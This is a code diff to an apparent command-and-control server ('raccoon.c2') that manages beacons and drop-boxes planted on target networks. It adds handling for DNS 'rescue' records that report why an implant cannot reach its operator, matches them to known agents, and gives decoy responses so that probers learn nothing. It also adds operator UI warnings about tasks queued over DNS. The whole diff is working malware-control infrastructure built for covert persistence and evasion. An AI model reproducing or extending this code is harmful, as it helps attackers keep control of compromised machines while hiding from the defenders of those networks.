@@ -59,6 +59,10 @@ except ImportError:
     # The container ships server.py and beacon.py side by side, not as a package.
     from beacon import decode_key, persistence_name
 
+# The rescue record's format. Shared with the DNS listener; the beacon
+# carries a copy, because the generator serves it as source text.
+from . import dns_rescue
+
 logger = logging.getLogger("raccoon.c2.server")
 server_log = logging.getLogger("raccoon.c2.events")
 agent_log = logging.getLogger("raccoon.c2.agents")
@@ -2790,6 +2794,13 @@ def create_app(crypto: ServerCrypto, operator_token: str, data_dir: Path,
             if payload is None:
                 return _fake_response()
 
+            # Before the action dispatch, and by a dedicated key rather
+            # than by a payload's shape: a rescue has no agent id and no
+            # action, because neither fits in a DNS label beside the
+            # record. See dns_rescue.WRAPPER_KEY for the arithmetic.
+            if dns_rescue.WRAPPER_KEY in payload:
+                return _handle_rescue(payload, crypto)
+
             action = payload.get("action", "")
             agent_id = payload.get("agent_id", "")
 
@@ -2846,6 +2857,100 @@ def _as_int(value, default: int) -> int:
         except (ValueError, OverflowError):
             pass
     return default
+
+
+# Rescues whose fingerprint matches no agent we know. Kept rather than
+# dropped: a drop-box that never managed to register is the case with the
+# least other evidence, and an operator staring at a silent fleet needs to
+# see that *something* out there is stuck and why.
+unattributed_rescues = []  # type: List[dict]
+
+_RESCUE_UNATTRIBUTED_MAX = 50
+
+_RESCUE_LEG_WORDS = {
+    "not_attempted": "not tried",
+    "answered": "answered",
+    "unreachable": "unreachable",
+    "refused": "connection refused",
+    "timed_out": "timed out",
+    "tls_failed": "TLS failed",
+    "http_status": "HTTP %d",
+    "auth_required": "wanted authentication",
+    "bad_payload": "answered with something unreadable",
+    "resolve_failed": "did not resolve (RCODE %d)",
+}
+
+
+def _rescue_summary(record: dict) -> str:
+    """The record as a sentence, because a hex dump is not a diagnosis."""
+    names = {value: key for key, value in dns_rescue.CLASSES.items()}
+    parts = []
+    for leg in dns_rescue.TRANSPORTS:
+        klass, code = record[leg]
+        word = _RESCUE_LEG_WORDS.get(names.get(klass, ""), "unknown")
+        if "%d" in word:
+            word = word % code
+        elif code and klass == dns_rescue.CLASSES["http_status"]:
+            word = "%s (%d)" % (word, code)
+        elif code:
+            word = "%s (%d)" % (word, code)
+        parts.append("%s: %s" % (leg.upper(), word))
+    extras = []
+    if record["flags"] & dns_rescue.FLAG_PROXY_FOUND:
+        extras.append("a proxy was found")
+    if record["flags"] & dns_rescue.FLAG_DOT1X_SEEN:
+        extras.append("802.1X seen")
+    if record["flags"] & dns_rescue.FLAG_PORTAL_ANSWERED:
+        extras.append("a captive portal answered")
+    summary = "; ".join(parts)
+    if extras:
+        summary += ". " + ", ".join(extras) + "."
+    return summary
+
+
+def _handle_rescue(payload: dict, crypto: ServerCrypto):
+    """A beacon with no upstream left, saying why.
+
+    The payload arrives through the ordinary beacon socket and the ordinary
+    `unwrap`, so nothing about decryption changes here. What is new is that
+    it carries no agent id -- the id would not fit in a DNS label -- only
+    two bytes of fingerprint, which are matched against the fleet.
+
+    The reply is whatever an ordinary check-in would get, so the exchange
+    tells a prober nothing about whether the record was understood.
+    """
+    blob = payload.get(dns_rescue.WRAPPER_KEY)
+    if not isinstance(blob, str):
+        return _fake_response()
+    try:
+        record = dns_rescue.unpack(base64.b64decode(blob))
+    except Exception as exc:
+        # The record came from a target. A version this server does not
+        # know, or a wrong length, is refused rather than read
+        # optimistically -- the struct would unpack and the result would be
+        # a confident lie about which leg failed.
+        logger.debug("rescue: unreadable record (%s)", type(exc).__name__)
+        return _fake_response()
+
+    stuck = {"summary": _rescue_summary(record),
+             "dns_answered": bool(record["flags"]
+                                  & dns_rescue.FLAG_DNS_ANSWERED),
+             "fingerprint": record["fingerprint"],
+             "at": _now()}
+    names = {value: key for key, value in dns_rescue.CLASSES.items()}
+    for leg in dns_rescue.TRANSPORTS:
+        klass, code = record[leg]
+        stuck[leg] = [names.get(klass, "unknown"), code]
+
+    for agent_id, info in agents.items():
+        if dns_rescue.fingerprint(agent_id) == record["fingerprint"]:
+            info["stuck"] = stuck
+            info["last_channel"] = "dns"
+            return _handle_beacon({"agent_id": agent_id}, crypto)
+
+    unattributed_rescues.append(stuck)
+    del unattributed_rescues[:-_RESCUE_UNATTRIBUTED_MAX]
+    return _fake_response()
 
 
 def _handle_register(payload: dict, crypto: ServerCrypto):
@@ -4369,7 +4474,8 @@ async function renderAgentView(id){
       <span class="tag">${esc(info.os||'?')}</span>
       <span class="detail">${esc(info.user||'?')}@${esc(info.hostname||'?')} · PID ${esc(info.pid||'?')} · up ${formatUptime(info.uptime||0)}</span>
       ${info.proxy_active ? '<span class="tag" style="background:#1a6e1a">PROXY: '+esc(info.proxy_active)+'</span>' : ''}
-      ${info.last_channel === 'dns' ? '<span class="tag" style="background:#6e5a1a" title="The last contact from this agent came over DNS. That channel carries tasking only: a task is delivered once and its result is never reported. Queue a task here and it will run with no outcome shown.">VIA DNS</span>' : ''}
+      ${info.last_channel === 'dns' ? '<span class="tag" style="background:#6e5a1a" title="The last contact from this agent came over DNS. A task is delivered once and its result is never reported, so queue one here and it will run with no outcome shown. The one thing this agent can still tell you is why it is stuck -- see Stuck below, if it has said.">VIA DNS</span>' : ''}
+      ${info.stuck ? `<div class="ai-warns" style="margin-top:6px"><b>Stuck:</b> ${esc(info.stuck.summary)}${info.stuck.dns_answered ? '' : ' <i>(the resolver did not answer, so nothing can leave)</i>'}</div>` : ''}
       ${info.c2_profile && info.c2_profile.active ? '<span class="tag" style="background:#4a1a6e;cursor:pointer" onclick="showBeaconConfig()" title="Click for details">&#128737; C2 Profile</span>' : '<span class="tag" style="background:#333;opacity:0.5">No C2 Profile</span>'}
     </div>
     <div class="terminal-wrap">
